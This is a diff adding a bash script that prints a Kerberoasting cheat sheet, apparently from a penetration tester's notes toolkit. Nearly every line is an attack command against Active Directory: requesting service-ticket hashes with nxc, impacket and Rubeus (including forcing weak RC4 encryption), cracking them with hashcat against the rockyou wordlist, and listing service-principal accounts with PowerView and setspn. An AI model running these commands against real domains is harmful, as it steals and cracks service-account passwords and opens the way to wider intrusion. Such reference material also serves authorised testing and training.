@@ -1,0 +1,46 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── KERBEROASTING ────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Request TGS (collect hashes) ─────────────────────${NC}"
+printf "\n"
+echo -e "  Note: nxc - primary:"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> --kerberoasting kerb.txt${NC}"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --kerberoasting kerb.txt${NC}"
+printf "\n"
+echo -e "  Note: impacket:"
+echo -e "  ${GREEN}impacket-GetUserSPNs DOMAIN/user:pass -dc-ip <DC_IP> -outputfile hashes.txt${NC}"
+printf "\n"
+echo -e "  Note: Rubeus - on Windows target:"
+echo -e "  ${GREEN}.\\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt${NC}"
+echo -e "  ${GREEN}.\\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes_rc4.txt${NC}  # force RC4"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Crack ────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt${NC}  # RC4 (most common)"
+echo -e "  ${GREEN}hashcat -m 19700 kerb.txt /usr/share/wordlists/rockyou.txt${NC}  # AES-128"
+echo -e "  ${GREEN}hashcat -m 19800 kerb.txt /usr/share/wordlists/rockyou.txt${NC}  # AES-256"
+echo -e "  ${GREEN}hashcat -m 13100 kerb.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Hash Format ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}\$krb5tgs\$23\$*username*domain*SPN*<data>${NC}  # RC4 (etype 23)"
+echo -e "  ${GREEN}\$krb5tgs\$17\$...${NC}                          # AES-128 (etype 17)"
+echo -e "  ${GREEN}\$krb5tgs\$18\$...${NC}                          # AES-256 (etype 18)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Find SPN Accounts (PowerView) ────────────────────${NC}"
+echo -e "  ${GREEN}Get-DomainUser -SPN | select SamAccountName,ServicePrincipalName${NC}"
+echo -e "  ${GREEN}setspn -T corp.com -Q */*${NC}                  # Windows native"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
